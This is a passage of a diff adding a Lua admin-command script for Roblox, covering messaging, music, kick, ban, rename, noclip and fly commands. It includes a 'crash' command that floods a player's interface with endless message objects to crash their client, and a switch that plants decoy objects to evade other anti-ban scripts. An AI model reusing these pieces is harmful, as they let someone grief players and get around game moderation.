+		if not pgui:FindFirstChild("Admi") or not pgui:FindFirstChild("Admi"):FindFirstChild("Msg") then
+			MakeMsgGui(player)
+		end
+
+		local message = pgui:FindFirstChild("Admi"):FindFirstChild("Msg")
+		
+		if title == nil then
+			title = "Message"
+		end
+		
+		if text == nil then
+			text = title
+			title = "Message"
+		end
+		
+		message.Size = UDim2.new(0,0,0,0)
+		message.Visible = true		
+		message.Title.Text = "[ Content Deleted ]"
+		message.Msg.Text = "[ Content Deleted ]"
+		message.Title.Text = tostring(title)
+		message.Msg.Text = tostring(text)
+		message.Position = UDim2.new(0.5,-125,0.5,-75)
+		message.Size = UDim2.new(0,250,0,150)
+		TweenTextTransparency(message.Title,1,0,tweentime*0.65)
+		TweenTextTransparency(message.Msg,1,0,tweentime*0.65)
+		TweenBackgroundTransparency(message,1,0.45,tweentime*0.5)
+		TweenRotation(message,5,0,tweentime*0.65)
+		--wait()
+		message:TweenSizeAndPosition(UDim2.new(0,500,0,300),UDim2.new(0.5,-250,0.5,-150),nil,tweenstyle,tweentime*1.1,true)
+		message.Visible = true
+		wait(tweentime)
+		if displaytime ~= nil then
+			Delay(displaytime,function()if message.Msg.Text == tostring(text)then DoDismissMessage(player)end end)
+		end
+	end)
+end
+
+function DisplayMessageAll(title,text,displaytime)
+	for _,i in pairs(Players:GetPlayers()) do
+		DisplayMessage(i,title,text,displaytime)
+	end
+end
+
+
+function DisplayMessageAllLegacy(title,text,displaytime)
+	for _,i in pairs(Players:GetPlayers()) do
+		DisplayMessageLegacy(i,title,text,displaytime)
+	end
+end
+
+function DismissMessageAll()
+	for _,i in pairs(Players:GetPlayers()) do
+		DismissMessage(i)
+	end
+end
+
+function DismissMessageAllLegacy()
+	for _,i in pairs(Players:GetPlayers()) do
+		DismissMessageLegacy(i)
+	end
+end
+	
+function DismissMessage(player)
+	if player == root or player == "root" then
+		return
+	end
+	if (SBMode or UseLegacyGuiSystem) and not Workspace.FilteringEnabled then
+		DismissMessageLegacy(player)
+		return
+	end
+	Spawn(function()
+		if not DismissMessageSignal then
+			FixAdminService()
+		end
+
+		--print("Fired DismissMessageSignal",player,title,text,displaytime)
+
+		DismissMessageSignal:FireClient(player)
+	end)
+end
+
+function DismissMessageLegacy(player)
+	if player == root or player == "root" then
+		return
+	end
+
+	if Workspace.FilteringEnabled then
+		error("Legacy gui functions cannot be used with Workspace.FilteringEnabled on")
+	end	
+	
+	if not player:WaitForChild("PlayerGui"):FindFirstChild("Admi") or not player:WaitForChild("PlayerGui"):FindFirstChild("Admi"):FindFirstChild("Msg") then
+		MakeMsgGui(player)
+	end
+	local message = player:WaitForChild("PlayerGui"):FindFirstChild("Admi"):FindFirstChild("Msg")
+	TweenBackgroundTransparency(message,0.45,1,tweentime*0.4)
+	TweenTextTransparency(message.Title,0,1,tweentime*0.275)
+	TweenTextTransparency(message.Msg,0,1,tweentime*0.275)
+	TweenRotation(message,360,320,tweentime*0.5)
+	message:TweenSizeAndPosition(UDim2.new(0,0,0,0),--[[UDim2.new(0,250,0,150),UDim2.new(0.5,-125,0.5,-75)]]UDim2.new(0.5,0,0.5,0),nil,tweenstyle,tweentime*2.2,true)
+	wait(tweentime*2.2)
+	if message.Position == UDim2.new(0.5,0,0.5,0) and message.Size == UDim2.new(0,0,0,0) then
+		message.Visible = false
+	end
+end
+
+function MakeAdmiGui(parent)
+	if parent == "root" or parent == root then
+		return
+	end
+	local Gui = Instance.new("ScreenGui",parent)
+	Gui.Name = "Admi"
+	return Gui
+end
+
+function MakeTellGui(parent)
+	if parent == "root" or parent == root then
+		return
+	end
+	local Gui = parent:FindFirstChild("Admi")
+	if not Gui then
+		Gui = MakeAdmiGui(parent)
+	end
+	local Bar = Instance.new("TextLabel",Gui)
+	Bar.Name = "Message"
+	Bar.BackgroundColor3 = Color3.new(0,0,0)
+	Bar.BackgroundTransparency = 0.35
+	Bar.BorderSizePixel = 0
+	Bar.Font = "ArialBold"
+	Bar.FontSize = "Size18"
+	Bar.Text = "Message"
+	Bar.TextStrokeTransparency = 0.5
+	Bar.TextColor3 = Color3.new(1,1,1)
+	Bar.Size = UDim2.new(1,0,0,32)
+	Bar.Position = UDim2.new(0,0,0,-32)
+	return Gui
+end
+
+function Tell(player,text,displaytime)
+	if player == root or player == "root" or player == nil then
+		return
+	end
+	if (SBMode or UseLegacyGuiSystem) and not Workspace.FilteringEnabled then
+		TellLegacy(player,text,displaytime)
+		return
+	end
+	Spawn(function()
+		if not DisplayMessageSignal then
+			FixAdminService()
+		end
+
+		--print("Fired TellSignal",player,title,text,displaytime)
+
+		TellSignal:FireClient(player,title,text,displaytime)
+	end)
+end
+
+function TellLegacy(player,msg,length)
+	if player == "root" or player == root or player == nil then
+		return
+	end
+	local length = length
+	if length == nil then
+		length = 3
+	end
+	local PlayerGui = player:WaitForChild("PlayerGui")
+	if not PlayerGui:FindFirstChild("Admi") or not PlayerGui:FindFirstChild("Admi"):FindFirstChild("Message") then
+		MakeTellGui(PlayerGui)
+	end
+	PlayerGui:FindFirstChild("Admi"):FindFirstChild("Message").Text = msg
+	PlayerGui:FindFirstChild("Admi"):FindFirstChild("Message").Position = UDim2.new(0,0,0,-30)
+	PlayerGui:FindFirstChild("Admi"):FindFirstChild("Message"):TweenPosition(UDim2.new(0,0,0,0),nil,tweenstyle,tweentime,true)
+	Delay(length,function()
+		if PlayerGui:FindFirstChild("Admi"):FindFirstChild("Message").Text == msg then
+			PlayerGui:FindFirstChild("Admi"):FindFirstChild("Message"):TweenPosition(UDim2.new(0,0,0,-30),nil,tweenstyle,tweentime,true)
+		end
+	end)
+end
+
+function TellAll(msg,length)
+	for _,i in pairs(Players:GetPlayers()) do
+		Tell(i,msg,length)
+	end
+end
+
+function TellAdmins(msg,length)
+	for _,i in pairs(Players:GetPlayers()) do
+		if Permissions[i.Name] and Permissions[i.Name] > 0 then
+			Tell(i,msg,length)
+		end
+	end
+end
+
+rawunpack = unpack
+
+function unpack(oldtab)
+	assert(oldtab,"u wot m8")
+	local new = ""
+	local tab = {}
+	for i = 1, #oldtab do
+		table.insert(tab,tostring(oldtab[i]))
+	end
+	table.sort(tab)
+	for i = 1, #tab do
+		new = new..tostring(tab[i])..", "
+	end
+	new = new:sub(1,#new-2)
+	return new
+end
+
+function stringtobool(str)
+	if str:lower() == "yes" or str:lower() == "on" or str:lower() == "ye" or str:lower() == "yea" or str:lower() == "yeah" or str:lower() == "yep" or str == "true" then
+		return true
+	elseif str:lower() == "no" or str:lower() == "off" or str:lower() == "nop" or str:lower() == "nope" or str:lower() == "nah" or str:lower() == "na" or str:lower() == "false" then
+		return false
+	end
+end
+
+setmetatable(Commands,{
+	__index = function(table,index)
+		if not rawget(table,index) then
+			error("The system tried to retrieve Commands."..tostring(index)..", which does not exist in this admin script. Most likely the game creator has misconfigured their admin, or you tried to make the command reach an unreachable command.") --next time don't break any links :)
+		end
+	end;
+	__gc = function()
+		error("OH NO I'M BEING GARBAGE COLLECTED\nTHIS ISN'T GOOD\nAAAAAAAAAAAAAAAA HELP ME MOMMY")
+	end;
+	__metatable = true;
+})
+
+-----------------------------------------------------------------
+-------------------------- Commands -----------------------------
+-----------------------------------------------------------------
+
+function Commands.m(args,sender)
+	MinimumPermission(1,sender)
+	local buildstring = ""
+	
+	for _,i in pairs(args) do
+		buildstring = buildstring..i.." "
+	end
+	buildstring = buildstring:sub(1,#buildstring-1)
+	DisplayMessageAll((sender ~= root and sender ~= "root") and sender.Name or "ADMIN",buildstring,6)
+end
+
+function Commands.pm(args,sender)
+	MinimumPermission(1,sender)
+	local plr = GetPlayersFromString(assert(args[1],"Player to PM missing"),sender)
+	local buildstring = ""
+	
+	for a,i in pairs(args) do
+		if a ~= 1 then
+			buildstring = buildstring..i.." "
+		end
+	end
+	
+	buildstring = buildstring:sub(1,#buildstring-1)
+	for _,i in pairs(plr) do
+		DisplayMessage(i,((sender ~= root and sender ~= "root") and sender.Name or "ADMIN"),buildstring,6)
+	end
+end
+
+function Commands.sm(args,sender)
+	MinimumPermission(2,sender)
+	local buildstring = ""
+	
+	for _,i in pairs(args) do
+		buildstring = buildstring..i.." "
+	end
+	
+	buildstring = buildstring:sub(1,#buildstring-1)
+	DisplayMessageAll("ADMIN",buildstring,6)
+end
+
+function Commands.h(args,sender)
+	MinimumPermission(1,sender)
+	local buildstring = ""
+	
+	for _,i in pairs(args) do
+		buildstring = buildstring..i.." "
+	end
+	
+	buildstring = buildstring:sub(1,#buildstring-1)
+	TellAll(((sender ~= root and sender ~= "root") and sender.Name or "ADMIN")..": "..buildstring,6)
+end
+
+function Commands.music(args,sender)
+	MinimumPermission(1,sender)
+	
+	if Players:FindFirstChild("RyanDolan123") and tonumber(args[1]) == 145542130 then
+		error("Don't play that song")
+	end
+	
+	local music = tonumber(args[1])
+	local pitch = 1
+	
+	while Workspace:FindFirstChild("AdmiMusic") do
+		Workspace:FindFirstChild("AdmiMusic"):Stop()
+		Workspace:FindFirstChild("AdmiMusic"):Destroy()
+	end
+	
+	if args[1] == "stop" then
+		TellAll("Music Stopped",3)
+		return
+	elseif not MusicStringData[args[1]] then
+		assert(music,"That song was not recognized as a valid asset or song ID")
+	else
+		if type(MusicStringData[args[1]]["Pitch"]) == "number" then
+			pitch = MusicStringData[args[1]]["Pitch"]
+		end
+		if type(MusicStringData[args[1]]["ID"]) == "number" then
+			music = MusicStringData[args[1]]["ID"]
+		end
+	end
+	
+	Tell(sender,"Attempting to Play Song "..music,2)
+	
+	local Songname = "Unable to fetch name ("..music..")"
+	
+	local ok,err = ypcall(function()
+		Songname = MarketplaceService:GetProductInfo(music)["Name"]
+	end)
+	
+	wait()
+	
+	local sound = Instance.new("Sound")
+	sound.SoundId = "http://www.roblox.com/asset/?id="..music
+	sound.Looped = true
+	sound.Volume = 1
+	sound.Pitch = 1
+	sound.Name = "AdmiMusic"
+	sound.Parent = Workspace
+	if not sound.IsPlaying then
+		repeat
+			sound:Play()
+			wait(0.25)
+			sound:Stop()
+			wait(0.25)
+			sound:Play()
+		until sound.IsPlaying
+	end
+	
+	TellAll("Now Playing - "..tostring(Songname),3)
+end
+
+function Commands.team(args,sender)
+	--error("Not yet implemented")
+	
+	MinimumPermission(1,sender)
+	
+	Tell(sender,"The team and neutral commands are currently a bit buggy. Sorry if you run into issues. :(")
+	
+	wait(3)
+	
+	local Plrs = GetPlayersFromString(assert(args[1],"Players to change team are missing"),sender)
+	assert(args[2],"Team is missing")
+	
+	local teamcolor
+	local teamname
+	
+	for _,i in pairs(game:GetService("Teams"):GetChildren()) do
+		if i:IsA("Team") and i.Name:lower():sub(1,args[1]:len()) == args[1]:lower() then
+			teamcolor = i.TeamColor
+			teamname = i.Name
+		end
+	end
+	
+	Tell(sender,tostring(teamcolor).." "..tostring(teamname))
+	
+	wait(1)
+	
+	for _,i in pairs(Plrs) do
+		i.TeamColor = teamcolor
+		i.Neutral = false
+	end	
+	
+	Tell(sender,"Changed team of "..tostring(unpack(Plrs)).." to "..tostring(teamname))
+	
+end
+
+function Commands.neutral(args,sender)
+	--error("Not yet implemented")
+	
+	MinimumPermission(1,sender)
+	
+	Tell(sender,"The team and neutral commands are currently a bit buggy. Sorry if you run into issues. :(")
+	
+	wait(3)
+	
+	assert(args[1],"Players to change team are missing")
+	
+	local Plrs = GetPlayersFromString(args[1],sender)
+	
+	for _,i in pairs(Plrs) do
+		i.Neutral = true
+		i.TeamColor = BrickColor.new("White")
+	end	
+	
+	Tell(sender,tostring(unpack(Plrs))..(#Plrs ~= 1 and " are now" or " is now").." neutral.")
+	
+end
+
+function Commands.hat(args,sender)
+	MinimumPermission(1,sender)
+	assert(tonumber(args[2]),"Hat to give is missing or is not a number")
+	assert(args[1],"Players to give hats to are missing")
+	
+	local Plrs = GetPlayersFromString(args[1],sender)
+	
+	
+	local Hats = InsertService:LoadAsset(tonumber(args[2]))
+	if Hats == nil then
+		error("Invalid hat")
+	end
+	for _,i in pairs(Plrs) do
+		for _,Hat in pairs(Hats:GetChildren()) do
+			if Hat:IsA("Hat") then
+				Hat:Clone().Parent = i.Character
+			end
+		end
+	end
+	Hats:Destroy()
+	
+	local Hatname = args[2]
+	
+	ypcall(function()
+		Hatname = MarketplaceService:GetProductInfo(tonumber(args[2]))["Name"]
+	end)
+	
+	Tell(sender,"Gave hat "..tostring(Hatname).." to "..tostring(unpack(Plrs)))
+end
+
+function Commands.gear(args,sender)
+	MinimumPermission(1,sender)
+	
+	if args[2] == "sword" then
+		Commands.sword({args[1]},sender)
+	end
+	
+	assert(tonumber(args[2]),"Gear to give is missing or is not a number")
+	assert(args[1],"Players to give gear to are missing")
+	
+	local Plrs = GetPlayersFromString(args[1],sender)
+	
+	
+	local Gears = InsertService:LoadAsset(tonumber(args[2]))
+	if Gears == nil then
+		error("Invalid gear")
+	end
+	for _,i in pairs(Plrs) do
+		if i:FindFirstChild("Backpack") then
+			for _,Gear in pairs(Gears:GetChildren()) do
+				if Gear:IsA("Tool") or Gear:IsA("HopperBin") then
+					Gear:Clone().Parent = i.Backpack
+				end
+			end
+		end
+	end
+	Gears:Destroy()
+	
+	local gearname = args[2]
+	
+	ypcall(function()
+		gearname = MarketplaceService:GetProductInfo(tonumber(args[2]))["Name"]
+	end)
+	
+	if args[2] ~= 125013769 then
+		Tell(sender,"Gave gear "..tostring(gearname).." to "..tostring(unpack(Plrs)))
+	else
+		Tell(sender,"Sworded "..tostring(unpack(Plrs)))
+	end
+end
+
+function Commands.sword(args,sender)
+	Commands.gear({args[1],125013769},sender)
+end
+
+function Commands.give(args,sender)
+	MinimumPermission(1,sender)
+	assert(args[2],"Tool to give is missing")
+	assert(args[1],"Players to give to are missing")
+	
+	local Plrs = GetPlayersFromString(args[1],sender)
+	
+	
+	local Gears = {}
+	
+	for _,i in pairs(ReplicatedStorage:GetChildren()) do
+		if i:IsA("Tool") or i:IsA("HopperBin") then
+			table.insert(Gears,i)
+		end
+	end
+	
+	for _,i in pairs(Lighting:GetChildren()) do
+		if i:IsA("Tool") or i:IsA("HopperBin") then
+			table.insert(Gears,i)
+		end
+	end
+	
+	for _,i in pairs(ServerStorage:GetChildren()) do
+		if i:IsA("Tool") or i:IsA("HopperBin") then
+			table.insert(Gears,i)
+		end
+	end
+		
+	for _,i in pairs(Plrs) do
+		if i:FindFirstChild("Backpack") then
+			for _,Gear in pairs(Gears) do
+				if Gear:IsA("Tool") or Gear:IsA("HopperBin") and i.Name:lower():sub(1,#args[2]) == args[2]:lower() then
+					Gear:Clone().Parent = i.Backpack
+				end
+			end
+		end
+	end
+	
+	Tell(sender,"Gave "..unpack(Gears).." to "..tostring(unpack(Plrs)))
+end
+
+function Commands.countdown(args,sender)
+	MinimumPermission(1,sender)
+	
+	local tme = assert(tonumber(args[1]),"Countdown time missing or not a number")
+	local msg = ""
+	
+	for _,i in ipairs(args) do
+		if _ > 1 then
+			msg = msg..tostring(i).." "
+		end
+	end
+	
+	for i = tme, 1, -1 do
+		DisplayMessageAll("Countdown",((msg and msg.."\n\n") or "")..i,3)
+		wait(1)
+		if StopCountdowns then
+			break
+		end
+	end
+	DismissMessageAll()
+end
+
+function Commands.hcountdown(args,sender)
+	MinimumPermission(1,sender)
+	
+	local tme = assert(tonumber(args[1]),"Countdown time missing or not a number")
+	local msg = ""
+	
+	for _,i in ipairs(args) do
+		if _ > 1 then
+			msg = msg..tostring(i).." "
+		end
+	end
+	
+	for i = tme, 1, -1 do
+		TellAll(((msg and msg.." ") or "")..i,1.15)
+		wait(1)
+		if StopCountdowns then
+			break
+		end
+	end
+end
+
+function Commands.stopcountdown(args,sender)
+	MinimumPermission(1,sender)
+	StopCountdowns = true
+	Tell(sender,"Stopping countdowns, give me a second...")
+	wait(1.1)
+	StopCountdowns = false
+	Tell(sender,"Done!",1.5)
+end
+
+function Commands.clearcountdown(...)
+	Commands.stopcountdown(...)
+end
+
+function Commands.globalshadows(...)
+	Commands.gshadows(...)
+end
+
+function Commands.colorshiftbottom(args,sender)
+	MinimumPermission(1,sender)
+	Lighting.ColorShift_Bottom = StringsToRGB(args[1],args[2],args[3])
+	Tell(sender,"Changed ColorShift_Bottom to ",args[1]..", "..args[2]..", "..args[3])
+end
+
+function Commands.colorshifttop(args,sender)
+	MinimumPermission(1,sender)
+	Lighting.ColorShift_Top = StringsToRGB(args[1],args[2],args[3])
+	Tell(sender,"Changed ColorShift_Top to ",args[1]..", "..args[2]..", "..args[3])
+end
+
+function Commands.disco(args,sender)
+	MinimumPermission(1,sender)
+	Tell(sender,"Turned on Disco!")
+	local oldambient = Lighting.Ambient
+	while wait(0.1) and not StopDisco do
+		Lighting.Ambient = Color3.new(math.random(),math.random(),math.random())
+	end
+	Lighting.Ambient = oldambient
+end
+
+function Commands.undisco(args,sender)
+	MinimumPermission(1,sender)
+	Tell(sender,"Turned off Disco!")
+	StopDisco = true
+	wait(1)
+	StopDisco = false
+end
+
+function Commands.ambient(args,sender)
+	MinimumPermission(1,sender)
+	Lighting.Ambient = StringsToRGB(args[1],args[2],args[3])
+	Tell(sender,"Changed Ambient to ",args[1]..", "..args[2]..", "..args[3])
+end
+
+function Commands.shadowcolor(args,sender)
+	MinimumPermission(1,sender)
+	Lighting.ShadowColor = StringsToRGB(args[1],args[2],args[3])
+	Tell(sender,"Changed ShadowColor to ",args[1]..", "..args[2]..", "..args[3])
+end
+
+function Commands.outdoorambient(args,sender)
+	MinimumPermission(1,sender)
+	Lighting.OutdoorAmbient = StringsToRGB(args[1],args[2],args[3])
+	Tell(sender,"Changed OutdoorAmbient to ",args[1]..", "..args[2]..", "..args[3])
+end
+
+function Commands.brightness(args,sender)
+	MinimumPermission(1,sender)
+	Lighting.Brightness = assert(tonumber(args[1]),"Brightness missing or not a valid number")
+	Tell(sender,"Changed Brightness to "..args[1])
+end
+
+function Commands.kick(args,sender)
+	MinimumPermission(2,sender)
+	assert(args[1],"Player to kick is missing")
+	local banned = GetPlayersFromString(args[1],sender)
+	
+	for _,i in pairs(banned) do
+		if avoidantibans then
+			Instance.new("Model",Players).Name = i.Name
+		end
+		i:Kick()
+	end
+	
+	Tell(sender,"Kicked "..tostring(unpack(banned))..".",3)
+end
+
+function Commands.char(args,sender)
+	MinimumPermission(1,sender)
+	
+	assert(args[1],"Player to change char missing")
+	
+	
+end
+
+function Commands.name(args,sender)
+	MinimumPermission(1,sender)
+	
+	assert(args[1],"Player to rename missing")
+	
+	local NewName = ""
+	
+	for a,i in ipairs(args) do
+		if a > 1 then
+			NewName = NewName..i.." "
+		end
+	end
+	
+	local Players = GetPlayersFromString(args[1],sender)
+	
+	for _,i in pairs(Players) do
+		if i.Character and i.Character:FindFirstChild("Humanoid") and i.Character:FindFirstChild("Head") then
+			for _,i in pairs(i.Character:GetChildren()) do
+				if i:IsA("Model") and i:FindFirstChild("NameChange") and i:FindFirstChild("Head") then
+					i:Destroy()
+				end
+			end
+			
+			local NameModel = Instance.new("Model",i.Character)
+			NameModel.Name = NewName
+			
+			local FakeHead = i.Character.Head:Clone()
+			FakeHead.Parent = NameModel
+			FakeHead.Transparency = 0
+			
+			local NCHumanoid = Instance.new("Humanoid", NameModel)
+			NCHumanoid.Name = "NameChange"
+			NCHumanoid.MaxHealth = 0
+			NCHumanoid.Health = 0
+			
+			local Weld = Instance.new("Weld", FakeHead)
+			Weld.Part0 = FakeHead
+			Weld.Part1 = i.Character.Head
+			
+			i.Character:FindFirstChild("Head").Transparency = 1
+		
+		end
+	end
+	
+	Tell(sender,"Renamed "..tostring(unpack(Players)).." to "..NewName..".",3)
+
+end
+
+function Commands.musiclist(args,sender)
+	
+	local songs = {}	
+	
+	local str = " You can use these song titled with the "..CommandPrefix.."music command.\nEach song's asset ID is also shown.\n\n\n"
+
+	for a,i in pairs(MusicStringData) do
+		table.insert(songs,tostring(a).." ("..tostring(i["ID"])..")")
+	end
+	
+	table.sort(songs)
+	
+	for _,i in pairs(songs) do
+		str = str..i.."\n"
+	end
+	
+	DisplayScrollFrame(sender,"Music List",str:sub(1, #str-1))
+end
+
+function Commands.rename(...)
+	Commands.name(...)
+end
+
+function Commands.unname(args,sender)
+	MinimumPermission(1,sender)
+	
+	assert(args[1],"Player to unname missing")
+	
+	local Players = GetPlayersFromString(args[1],sender)
+	
+	for _,i in pairs(Players) do
+		if i.Character and i.Character:FindFirstChild("Head") then
+			for _,i in pairs(i.Character:GetChildren()) do
+				if i:IsA("Model") and i:FindFirstChild("NameChange") and i:FindFirstChild("Head") then
+					i:Destroy()
+				end
+			end
+			i.Character:FindFirstChild("Head").Transparency = 0
+		end
+	end
+	
+	Tell(sender,"Unnamed "..tostring(unpack(Players)),3)
+
+end
+
+function Commands.char(args,sender)
+	MinimumPermission(1,sender)
+	
+	local Players = GetPlayersFromString(assert(args[1],"Player to change char missing"),sender)
+	local UserId = assert(tonumber(args[2]),"User ID to change players' characters into missing or not a number")
+	
+	for _,i in pairs(Players) do
+		if i.Character and i.Character:FindFirstChild("Head") then
+			i.CharacterAppearance = "http://www.roblox.com/Asset/CharacterFetch.ashx?UserId="..UserId.."&placeId="..tostring(game.PlaceId)
+			i:LoadCharacter()
+		end
+	end
+	
+	Tell(sender,"Changed the characters of "..tostring(unpack(Players)).." to "..tostring(args[2]),3)
+
+end
+
+--[[
+function Commands.kicknilplayers(args,sender)
+	MinimumPermission(2,sender)
+	
+	for _,i in pairs(AllPlayers) do
+		ypcall(function()
+			if i.Parent ~= Players then
+				i:Kick()
+			end
+		end)
+	end
+	
+	if NetworkServer then
+		for _,i in pairs(NetworkServer:GetChildren()) do
+			ypcall(function()
+				if i:IsA("NetworkReplicator") then
+					if i:GetPlayer() and i:GetPlayer().Parent == nil then
+						i:GetPlayer():Kick()
+					end
+				end
+			end)
+		end
+	end
+	
+	Tell(sender,"Tried to kick all nil players!",6)
+end]] --doesn't even work, no point in existence
+
+function Commands.ban(args,sender)
+	MinimumPermission(2,sender)
+	assert(args[1],"Player to ban is missing")
+	local banned = GetPlayersFromString(args[1],sender)
+	
+	for _,i in pairs(banned) do
+		table.insert(BannedPlayers,i.Name)
+		if avoidantibans then
+			Instance.new("Model",Players).Name = i.Name
+		end
+		i:Kick()
+	end
+	
+	Tell(sender,"Banned "..tostring(unpack(banned))..".",3)
+end
+
+function Commands.crash(args,sender)
+	MinimumPermission(2,sender)
+	assert(args[1],"Player to ban is missing")
+	local banned = GetPlayersFromString(args[1],sender)
+	
+	Tell(sender,"Crashing "..tostring(unpack(banned))..".",3)
+	
+	while wait() do
+		for _,i in pairs(banned) do
+			pcall(function()
+				for _,a in pairs(i:GetChildren()) do
+					if a:IsA("PlayerGui") then
+						while wait() do
+							for b = 1, 50 do
+								Instance.new("Message",a).Text = "bye"
+							end
+						end
+					end
+				end
+			end)
+		end
+	end
+	
+end
+
+
+
+function Commands.noclip(args,sender)
+	MinimumPermission(1,sender)
+	assert(args[1],"Player to noclip is missing")
+	local flyme = GetPlayersFromString(args[1],sender)
+	for _,i in pairs(flyme) do
+		MakeLocalScript([[
+			local Player = game.Players.LocalPlayer
+			local Mouse = Player:GetMouse()
+			local Character = Player.Character
+			local Humanoid = Character:FindFirstChild("Humanoid")
+			local Torso = Character:WaitForChild("Torso")
+			local Camera = Workspace.CurrentCamera
+			local Move = {W = 0, S = 0, A = 0, D = 0}
+			local Speed = 2
+			
+			Instance.new("StringValue",script).Name = "DO_NOT_REENABLE"			
+			
+			script.Parent = Player:FindFirstChild("PlayerGui")
+			script.Name = "ADMIN_NOCLIP_SCRIPT"
+			
+			Mouse.KeyDown:connect(function(key)
+				if key:lower() == "w" then
+					Move.W = 1
+				elseif key:lower() == "s" then
+					Move.S = 1
+				elseif key:lower() == "a" then
+					Move.A = 1
+				elseif key:lower() == "d" then
+					Move.D = 1
+				elseif key:lower() == "q" then
+					Speed = Speed + 1
+				elseif key:lower() == "e" then
+					Speed = Speed - 1
+				end
+			end)
+			
+			Mouse.KeyUp:connect(function(key)
+				if key:lower() == "w" then
+					Move.W = 0
+				elseif key:lower() == "s" then
+					Move.S = 0
+				elseif key:lower() == "a" then
+					Move.A = 0
+				elseif key:lower() == "d" then
+					Move.D = 0
+				end
+			end)
+			
+			Torso.Anchored = true
+			Humanoid.PlatformStand = true
+			
+			local eventt = Humanoid.Changed:connect(function()
+				Humanoid.PlatformStand = true
+			end)
+			
+			local event = game:GetService("RunService").RenderStepped:connect(function()
+				Torso.CFrame = CFrame.new(
+					Torso.Position,
+					Camera.CoordinateFrame.p) *
+					CFrame.Angles(0, math.rad(180), 0) *
+					CFrame.new((Move.D - Move.A) *
+					Speed,
+					0,
+					(Move.S - Move.W) *
+					Speed
+				)
+			end)
+			
+			repeat wait(0.25) until not script.Parent
+			
+			event:disconnect()
+			eventt:disconnect()]],
+		i:FindFirstChild("PlayerGui"),true)
+	end
+	
+	Tell(sender,"Noclipped "..tostring(unpack(flyme))..".",3)
+end
+
+function Commands.autoexecuterespawn(args,sender)
+	MinimumPermission(2,sender)
+	local build = ""
+	for _,i in pairs(args) do
+		build = build..i.." "
+	end
+	build = build:sub(1,#build-1):gsub("%[playername%]","%[PlayerName%]")
+	
+	AutoExecuteRespawn = ""
+	for i in build:lower():gmatch("[^;]+") do
+		AutoExecuteRespawn = AutoExecuteRespawn..i.."\n"
+	end
+	
+	Tell(sender,"Changed AutoExecuteRespawn!")
+end
+
+function Commands.commandscript(args,sender)
+	MinimumPermission(2,sender)
+	local build = ""
+	for _,i in ipairs(args) do
+		build = build..i.." "
+	end
+	build = build:sub(1,#build-1):gsub("%[playername%]","%[PlayerName%]")
+	
+	Tell(sender,"Running CommandScript!...")
+	
+	CmdScriptBuild = ""
+	for i in build:lower():gmatch("[^;]+") do
+		Chatted(root,i)
+	end
+	
+	Tell(sender,"Ran CommandScript!")
+end
+
+function Commands.fly(args,sender)
+	MinimumPermission(1,sender)
+	assert(args[1],"Player to fly is missing")
+	local flyme = GetPlayersFromString(args[1],sender)
+	for _,i in pairs(flyme) do
+		MakeLocalScript([[
+			local Player = game:GetService("Players").LocalPlayer
+			local Mouse = Player:GetMouse()
+			local Torso = Player.Character:WaitForChild("Torso")
+			local Humanoid = Player.Character:WaitForChild("Humanoid")
+			local Flying = true
+			local Control = {f = 0, b = 0, l = 0, r = 0} 
+			local LastControl = {f = 0, b = 0, l = 0, r = 0} 
+			local MaxSpeed = 50 
+			local Speed = 0
+			local Camera = Workspace.CurrentCamera
+			
+			local FlySmoke = Instance.new("Smoke",Torso)
+			FlySmoke.Name = "FlySmoke"
+			FlySmoke.Opacity = 0.08
+			FlySmoke.Size = 25
+			
+			Instance.new("StringValue",script).Name = "DO_NOT_REENABLE"			
+			
+			script.Parent = Player:FindFirstChild("PlayerGui")
+			script.Name = "ADMIN_FLY_SCRIPT"
+			
+			function Fly() 
+				local Gyro = Instance.new("BodyGyro", Torso) 
+				Gyro.P = 9e4 
+				Gyro.maxTorque = Vector3.new(9e9, 9e9, 9e9) 
+				Gyro.cframe = Torso.CFrame --why is cframe in lowercase for BodyGyros
+				
+				local Velocity = Instance.new("BodyVelocity", Torso) 
+				Velocity.velocity = Vector3.new(0,0.1,0) --roblox why is velocity lowercase
+				Velocity.maxForce = Vector3.new(9e9, 9e9, 9e9) 
+				
+				repeat
+					wait() 
+					
+					Humanoid.PlatformStand = true 
+					
+					if Control.l + Control.r + Control.f + Control.b > 0 then
+						FlySmoke.Enabled = true
+					else
+						FlySmoke.Enabled = false
+					end
+					
+					if Control.l + Control.r ~= 0 or Control.f + Control.b ~= 0 then 
+					
+						Speed = Speed+.5+(Speed/MaxSpeed) 
+						
+						if Speed > MaxSpeed then 
+							Speed = MaxSpeed 
+						end 
+					elseif not (Control.l + Control.r ~= 0 or Control.f + Control.b ~= 0) and Speed ~= 0 then 
+						Speed = Speed-1 
+						if Speed < 0 then 
+							Speed = 0 
+						end 
+					end 
+						
+					if (Control.l + Control.r) ~= 0 or (Control.f + Control.b) ~= 0 then 
+					
+						Velocity.velocity = 
+							((Camera.CoordinateFrame.lookVector * (Control.f + Control.b)) +
+							((Camera.CoordinateFrame * CFrame.new(Control.l + Control.r,(Control.f + Control.b) * 0.2, 0).p) - --yuck
+							Camera.CoordinateFrame.p))*Speed
+							
+						LastControl = {f = Control.f, b = Control.b, l = Control.l, r = Control.r}
+						
+					elseif (Control.l + Control.r) == 0 and (Control.f + Control.b) == 0 and Speed ~= 0 then 
+					
+						Velocity.velocity = 
+							((Camera.CoordinateFrame.lookVector * (LastControl.f + LastControl.b)) +
+							((Camera.CoordinateFrame * CFrame.new(LastControl.l + LastControl.r, (LastControl.f + LastControl.b) * 0.2, 0).p) - --also yuck
+							Camera.CoordinateFrame.p))*Speed 
+							
+					else 
+						Velocity.velocity = Vector3.new(0,0.1,0) 
+					end
+					
+					Gyro.cframe = Camera.CoordinateFrame * CFrame.Angles(-math.rad((Control.f+Control.b)*50*Speed/MaxSpeed),0,0) 
+					
+				until not Flying or not script.Parent
+				
+				Control = {f = 0, b = 0, l = 0, r = 0} 
+				LastControl = {f = 0, b = 0, l = 0, r = 0} 
+				Speed = 0
+				Gyro:Destroy()
+				Velocity:Destroy()
+				Humanoid.PlatformStand = false 
+				
+			end
+			
+			Mouse.KeyDown:connect(function(key) 
+				if key:lower() == "e" then 
+					Flying = not Flying
+					if Flying then
+						Fly()
+					end
+				elseif key:lower() == "w" then 
+					Control.f = 1 
+				elseif key:lower() == "s" then 
+					Control.b = -1 
+				elseif key:lower() == "a" then 
+					Control.l = -1 
+				elseif key:lower() == "d" then 
+					Control.r = 1 
+				end 
+			end) 
+			
+			Mouse.KeyUp:connect(function(key) 
+				if key:lower() == "w" then 
+					Control.f = 0 
+				elseif key:lower() == "s" then 
+					Control.b = 0 
+				elseif key:lower() == "a" then 
+					Control.l = 0 
